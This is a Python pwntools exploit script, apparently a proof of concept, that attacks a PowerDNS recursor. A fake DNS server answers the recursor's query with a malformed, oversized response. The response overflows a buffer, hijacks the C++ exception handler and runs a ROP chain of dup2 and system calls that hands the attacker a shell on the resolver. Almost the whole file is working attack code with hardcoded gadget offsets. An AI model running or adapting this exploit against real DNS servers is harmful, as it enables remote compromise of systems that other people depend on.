#!/usr/bin/env python3

from pwn import *
from dnslib import DNSRecord

IP = '127.0.0.1'
PDNS_PORT = 31337
LISTEN_PORT = 55353

HIJACK_HANDLER_OFFSET = 0xad2a1
LIBC_OFFSET = 0x35c000

context.arch = 'amd64'
libstdcpp = ELF("/usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.28")
libstdcpp.address = 0x7ffff7daa000  # This would usually be required via leak.

libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc.address = libstdcpp.address - LIBC_OFFSET

def do_exploit(r):
    b = libstdcpp.address

    '''
    # This would call libstdcpp write to leak libc location
    rop = ROP([libstdcpp])
    rop.write(9, libstdcpp.address + 0x0215db0, 8   )
    rop.raw(p64(0xdeadbeef))
    '''

    rop_pl = b''
    rop_pl += p64(b + 0xaa71c) # pop rdi ; ret
    rop_pl += p64(9)
    rop_pl += p64(b + 0xaeabe) # pop rsi ; ret
    rop_pl += p64(0)
    rop_pl += p64(libc.symbols['dup2'])
    rop_pl += p64(b + 0xaa71c) # pop rdi ; ret
    rop_pl += p64(9)
    rop_pl += p64(b + 0xaeabe) # pop rsi ; ret
    rop_pl += p64(1)
    rop_pl += p64(libc.symbols['dup2'])
    rop_pl += p64(b + 0xaa71c) # pop rdi ; ret
    rop_pl += p64(libc.address + 0x1b45bd)
    rop_pl += p64(libc.symbols['system'])


    # random dns preamble
    pl = b"\xa3\x78\x81\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    # expansion madness to fill buffer
    pl += (b'\x7e'+b'a'*126 ) * 4
    # length of exploiting entry:
    pl += b'\xff'
    pl += fit({
        # this address will be the control flow hijack in the exception handler. 
        # we will do some stack "lifting" to get back to our payload
        28: p64(libstdcpp.address + 0x0000000000171257), # sub rsp, 0x40, pop, pop, pop, ret 
        36: p64(0x00000000766000+768), # TODO: Find comparable entry in +w stdlibc++ space
        44: p64(libstdcpp.address + HIJACK_HANDLER_OFFSET ),
        116: rop_pl

    }, length=0xff)
    # trigger the throw
    pl += b"\x10" + b"A"*0x10

    r.send(pl)

def main():
    # Our fake dns server, serving the exploit payload
    server(LISTEN_PORT, typ='udp', callback=do_exploit)

    # open a tcp connection to pdns to interact with later
    x = remote(IP, PDNS_PORT)

    # Send DNS request. We don't care about the answer, so let's use a timeout
    try:
        q = DNSRecord.question("exploit.com")
        q.send(IP, PDNS_PORT,timeout=0.001)
    except Exception as e:
        pass

    log.success("Go check your pdns_recursor, it should be a shell now!")

if __name__ == '__main__':
    main()
